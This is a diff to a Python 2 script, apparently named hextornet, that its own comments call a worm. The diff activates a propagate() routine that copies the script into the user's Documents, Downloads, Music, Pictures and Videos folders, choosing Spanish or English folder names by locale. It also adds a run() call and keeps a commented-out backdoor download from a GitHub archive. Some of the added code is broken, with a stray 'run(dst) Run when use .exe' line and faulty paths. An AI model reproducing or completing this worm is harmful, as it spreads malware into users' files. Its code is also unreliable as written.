@@ -10,6 +10,7 @@ import os, random, sys, pkg_resources
 from urllib2 import urlopen
 import subprocess as sp
 import shutil
+import locale
 
 
 print(
@@ -30,28 +31,35 @@ print(
 		dst = "C:\\Users\\" + usr + "\\hextornet.py"
 	
 	else:
-			dst = os.getcwd() + "hextornet.py"
+		dst = os.getcwd() + "hextornet.py"
 """
 
 src = os.path.abspath("hextornet.py")
 usr = getpass.getuser()
+lang = locale.getdefaultlocale()
+
+lang_es = ['Documentos', 'Descargas', 'Musica', 'Imagenes', 'Videos']
+lang_en = ['Documents', 'Downloads', 'Music', 'Pictures', 'Videos']
+
+if lang == ('en_US', 'UTF-8'):
+	directories = lang_en
+else:
+	directories = lang_es
+
+dst = ""
 
 def propagate():
 
-	directoriesLinux = ["Documents", "Downloads", "Music", "Pictures", "Videos"]
-
-	dst = ""
-
 	#Propagate worn in all directories
 	print("==========Worm location==========")
-	while len(directoriesLinux) != 0:
-		for directory in directoriesLinux:
+	while len(directories) != 0:
+		for directory in directories:
 			if(os.path.isdir("/" + usr + "/" + directory + "/")):
 				dst = "/" + usr + "/" + directory + "/" + "hextornet.py"
 				print"dst:", dst
-			directoriesLinux.remove(directory)
-        		copyfile(src, dst)
-			#run(dst) Run when use .exe 
+			directories.remove(directory)
+        copyfile(src, dst)
+	run(dst) Run when use .exe 
 	print("=================================")
 
 def copy():
@@ -99,7 +107,7 @@ def run(program):
 def main():
 	#copy()
 	#hide()
-	#propagate()
+	propagate()
 	#downloadBackDoor("https://github.com/hectormtc/hextornet/archive/master.zip")
 
 if __name__ == "__main__":
